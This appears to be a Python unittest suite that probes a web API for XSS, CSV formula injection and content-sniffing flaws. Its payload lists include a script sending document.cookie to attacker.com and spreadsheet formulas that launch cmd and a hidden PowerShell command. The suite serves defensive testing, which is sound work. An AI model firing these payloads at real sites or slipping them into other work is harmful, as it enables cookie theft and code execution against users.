"""
Cross-Site Scripting (XSS) Security Tests

This module tests protection against various types of XSS attacks, including:
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Template injection XSS
"""

import unittest
import requests
import os
import sys
import re
import json
import random
import string
import html
import urllib.parse

# Add the project root to the Python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))

class XSSSecurityTests(unittest.TestCase):
    """Test cases for XSS protection"""
    
    def setUp(self):
        """Set up test environment"""
        # API endpoint configuration
        self.base_url = os.environ.get('TECHSAAS_API_URL', 'http://localhost:5000')
        self.login_url = f"{self.base_url}/api/v1/auth/login"
        self.search_url = f"{self.base_url}/api/v1/search"
        self.comment_url = f"{self.base_url}/api/v1/comments"
        self.profile_url = f"{self.base_url}/api/v1/user/profile"
        
        # Test credentials
        self.valid_credentials = {
            "email": "test@example.com",
            "password": "SecureP@ssw0rd!"
        }
        
        # Set up headers
        self.headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'TechSaaS-Security-Test/1.0',
        }
        
        # Generate a random identifier for test data
        self.test_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        # Login to get authentication token
        try:
            login_response = requests.post(
                self.login_url, 
                headers=self.headers, 
                json=self.valid_credentials,
                timeout=5
            )
            
            if login_response.status_code == 200:
                token = login_response.json().get('access_token')
                if token:
                    self.headers['Authorization'] = f"Bearer {token}"
        except:
            # Continue without authentication if login fails
            pass
        
        # XSS payloads for testing
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "\"><script>alert('XSS')</script>",
            "<div style=\"background-color: expression(alert('XSS'))\">",
            "<script>document.querySelector('#techsaas').innerHTML='Hacked'</script>",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<input onfocus=alert('XSS') autofocus>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
            "'-alert('XSS')-'",
            "<img src=\"x\" onmouseover=\"alert('xxs')\">",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<div onclick=\"alert('XSS')\" style=\"cursor:pointer\">Click me</div>"
        ]
    
    def test_reflected_xss_search(self):
        """Test protection against reflected XSS in search functionality"""
        for payload in self.xss_payloads:
            # URL encode the payload
            encoded_payload = urllib.parse.quote_plus(payload)
            
            # Test in search query parameter
            search_url_with_payload = f"{self.search_url}?q={encoded_payload}"
            response = requests.get(search_url_with_payload, headers=self.headers)
            
            # Check if the payload was properly sanitized in the response
            if response.status_code == 200:
                # The raw payload should not be in the response
                self.assertNotIn(payload, response.text, 
                               f"Reflected XSS possible with payload: {payload}")
                
                # If there's a search term reflector, it should be properly encoded
                if 'q=' in response.text or 'query=' in response.text or 'search=' in response.text:
                    # The response should contain the HTML-encoded version if it reflects the input
                    if payload in response.text:
                        html_encoded = html.escape(payload)
                        self.assertIn(html_encoded, response.text, 
                                    f"Search term not properly encoded for payload: {payload}")
    
    def test_stored_xss_comments(self):
        """Test protection against stored XSS in comment functionality"""
        for payload in self.xss_payloads:
            # Create a comment with the XSS payload
            comment_data = {
                "content": f"Test comment {self.test_id} with {payload}",
                "itemId": "test-item-123"
            }
            
            # Submit the comment
            post_response = requests.post(self.comment_url, headers=self.headers, json=comment_data)
            
            # If comment submission succeeds, check how the payload is handled when retrieved
            if post_response.status_code in [200, 201]:
                # Get the comments for the item
                get_response = requests.get(f"{self.comment_url}?itemId=test-item-123", headers=self.headers)
                
                if get_response.status_code == 200:
                    # The raw payload should not be in the response
                    self.assertNotIn(payload, get_response.text, 
                                   f"Stored XSS possible with payload: {payload}")
                    
                    # If the comment is returned, the payload should be properly encoded
                    if self.test_id in get_response.text:
                        html_encoded = html.escape(payload)
                        self.assertIn(html_encoded, get_response.text, 
                                    f"Comment content not properly encoded for payload: {payload}")
    
    def test_stored_xss_profile(self):
        """Test protection against stored XSS in user profile"""
        for field in ['name', 'bio', 'location', 'website']:
            for payload in self.xss_payloads[:5]:  # Use a subset to avoid too many requests
                # Update profile with XSS payload
                profile_data = {
                    field: f"Test {self.test_id} {payload}"
                }
                
                # Submit the profile update
                put_response = requests.put(self.profile_url, headers=self.headers, json=profile_data)
                
                # If profile update succeeds, check how the payload is handled when retrieved
                if put_response.status_code in [200, 201, 204]:
                    # Get the profile
                    get_response = requests.get(self.profile_url, headers=self.headers)
                    
                    if get_response.status_code == 200:
                        # The raw payload should not be in the response
                        self.assertNotIn(payload, get_response.text, 
                                       f"Stored XSS possible in {field} with payload: {payload}")
                        
                        # If the field is returned, the payload should be properly encoded
                        if self.test_id in get_response.text:
                            html_encoded = html.escape(payload)
                            # Check if it's JSON
                            try:
                                response_json = get_response.json()
                                if field in response_json and self.test_id in response_json[field]:
                                    # For JSON, we expect the value to not contain script tags
                                    self.assertNotIn("<script>", response_json[field], 
                                                   f"Profile JSON not properly sanitized for {field}: {payload}")
                            except json.JSONDecodeError:
                                # For HTML, we expect proper encoding
                                self.assertIn(html_encoded, get_response.text, 
                                           f"Profile content not properly encoded for {field}: {payload}")
    
    def test_dom_xss_via_fragment(self):
        """Test protection against DOM-based XSS via URL fragments"""
        dom_xss_payloads = [
            "#<script>alert('XSS')</script>",
            "#javascript:alert('XSS')",
            "#data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "#<img src=x onerror=alert('XSS')>",
            "#{'a':alert('XSS')}"
        ]
        
        # Endpoints that might use URL fragments
        fragment_endpoints = [
            f"{self.base_url}/dashboard",
            f"{self.base_url}/profile",
            f"{self.base_url}/settings",
            f"{self.base_url}/docs"
        ]
        
        for endpoint in fragment_endpoints:
            for payload in dom_xss_payloads:
                # Create a URL with the XSS payload in the fragment
                url_with_payload = f"{endpoint}{payload}"
                
                # Make a request to the page
                response = requests.get(url_with_payload, headers=self.headers)
                
                if response.status_code == 200:
                    # Check for common DOM XSS sinks
                    dom_xss_sinks = [
                        "document.write(",
                        "innerHTML",
                        "outerHTML",
                        "insertAdjacentHTML",
                        "eval(",
                        "setTimeout(",
                        "setInterval(",
                        "location.hash",
                        "location.href"
                    ]
                    
                    for sink in dom_xss_sinks:
                        # Look for unsafe usage of DOM XSS sinks with user input
                        unsafe_patterns = [
                            f"{sink}(location.hash",
                            f"{sink} = location.hash",
                            f"{sink}(window.location",
                            f"{sink} = window.location",
                            f"{sink}(document.URL",
                            f"{sink} = document.URL"
                        ]
                        
                        for pattern in unsafe_patterns:
                            self.assertNotIn(pattern, response.text, 
                                           f"Potentially unsafe DOM XSS sink usage found: {pattern}")
    
    def test_xss_via_file_upload_names(self):
        """Test protection against XSS via file upload names"""
        if not hasattr(self, 'upload_url'):
            # Find file upload endpoints in the API
            try:
                upload_endpoints = [
                    f"{self.base_url}/api/v1/upload",
                    f"{self.base_url}/api/v1/files/upload",
                    f"{self.base_url}/api/v1/user/avatar"
                ]
                
                for endpoint in upload_endpoints:
                    response = requests.options(endpoint, headers=self.headers)
                    if response.status_code < 400:
                        self.upload_url = endpoint
                        break
            except:
                # Skip test if no upload endpoint is found
                return
        
        # XSS payloads for filenames
        filename_xss_payloads = [
            "xss<script>alert('XSS')</script>.jpg",
            "xss\"><img src=x onerror=alert('XSS')>.jpg",
            "xss.jpg<script>alert('XSS')</script>",
            "xss.jpg\"><img src=x onerror=alert('XSS')>",
            "xss.jpg<!--<script>alert('XSS')</script>-->"
        ]
        
        for payload in filename_xss_payloads:
            # Create a simple file with XSS payload in the name
            files = {'file': (payload, b'dummy content', 'image/jpeg')}
            
            # Attempt to upload the file
            response = requests.post(self.upload_url, headers=self.headers, files=files)
            
            # If upload succeeds, check the response for XSS vulnerabilities
            if response.status_code in [200, 201]:
                # The raw payload should not be in the response
                self.assertNotIn("<script>", response.text, 
                               f"Possible XSS via filename: {payload}")
                
                # The filename should be properly encoded/sanitized if included in the response
                if payload.replace("<script>alert('XSS')</script>", "") in response.text:
                    # Check for any unencoded parts of the payload
                    xss_indicators = ["<script>", "onerror=", "javascript:"]
                    for indicator in xss_indicators:
                        self.assertNotIn(indicator, response.text, 
                                       f"Filename not properly sanitized: {payload}")
    
    def test_xss_via_csv_export(self):
        """Test protection against XSS in CSV exports (CSV Injection)"""
        # Try to find export endpoints
        export_endpoints = [
            f"{self.base_url}/api/v1/export/csv",
            f"{self.base_url}/api/v1/data/export",
            f"{self.base_url}/api/v1/reports/export"
        ]
        
        # Formula injection payloads (can trigger XSS when opened in Excel)
        csv_injection_payloads = [
            "=cmd|' /C calc'!A0",
            "@SUM(1+1)*cmd|' /C calc'!A0",
            "+IMPORTXML(CONCAT('http://localhost:5000/?c=', CONCATENATE(A1:F1)), '//')",
            "=HYPERLINK(\"javascript:alert('XSS')\")",
            "=cmd|'/c calc'!A0",
            "=cmd|'/c powershell -NoP -W Hidden -e MQAhACEAMQAhACEAIAB0AGgAaQBzACAAaQBzACAAWABTAFMA'!A0"
        ]
        
        for endpoint in export_endpoints:
            try:
                # First attempt to identify required parameters
                options_response = requests.options(endpoint, headers=self.headers)
                
                if options_response.status_code < 400:
                    # Try different parameter names that might be used for custom exports
                    for param_name in ['fields', 'columns', 'data', 'query']:
                        for payload in csv_injection_payloads:
                            # Try both query parameter and JSON body
                            # Query parameter
                            query_response = requests.get(f"{endpoint}?{param_name}={urllib.parse.quote_plus(payload)}", 
                                                       headers=self.headers)
                            
                            # JSON body
                            json_body = {param_name: payload}
                            json_response = requests.post(endpoint, headers=self.headers, json=json_body)
                            
                            # Check responses for CSV content
                            for response in [query_response, json_response]:
                                if response.status_code == 200 and 'csv' in response.headers.get('Content-Type', '').lower():
                                    # Check for protection mechanisms
                                    csv_content = response.text
                                    
                                    # Formula should be escaped in CSV (e.g., with ' prefix or in quotes)
                                    if payload in csv_content:
                                        # Formulas should be properly escaped
                                        self.assertTrue(
                                            f"'{payload}" in csv_content or f"\"{payload}\"" in csv_content,
                                            f"CSV Export may be vulnerable to formula injection: {payload}"
                                        )
            except:
                # Skip unreachable endpoints
                continue
    
    def test_content_sniffing_protection(self):
        """Test protection against content sniffing XSS attacks"""
        # Create a text file with JavaScript that browsers might execute if content sniffing is enabled
        js_payload = "<script>alert('XSS')</script>"
        
        # Try to find file serving endpoints
        file_endpoints = [
            f"{self.base_url}/api/v1/files/view",
            f"{self.base_url}/api/v1/download",
            f"{self.base_url}/api/v1/documents/view"
        ]
        
        for endpoint in file_endpoints:
            try:
                # First try to upload a file with JavaScript content but text MIME type
                files = {'file': ('harmless.txt', js_payload, 'text/plain')}
                
                upload_url = endpoint.replace('/view', '/upload').replace('/download', '/upload')
                upload_response = requests.post(upload_url, headers=self.headers, files=files)
                
                # If upload succeeds, try to access the file
                if upload_response.status_code in [200, 201]:
                    # Extract file ID from response
                    try:
                        file_id = upload_response.json().get('id', 'test-file-123')
                    except:
                        file_id = 'test-file-123'
                    
                    # Access the file
                    view_response = requests.get(f"{endpoint}?id={file_id}", headers=self.headers)
                    
                    # Check for X-Content-Type-Options header to prevent content sniffing
                    self.assertIn('X-Content-Type-Options', view_response.headers, 
                                f"Missing X-Content-Type-Options header on {endpoint}")
                    
                    self.assertEqual(view_response.headers['X-Content-Type-Options'].lower(), 'nosniff', 
                                   f"X-Content-Type-Options should be set to 'nosniff' on {endpoint}")
                    
                    # Content type should match what we uploaded
                    self.assertIn('text/plain', view_response.headers.get('Content-Type', '').lower(), 
                                f"Content-Type header mismatch on {endpoint}")
            except:
                # Skip unreachable endpoints
                continue

if __name__ == "__main__":
    unittest.main()
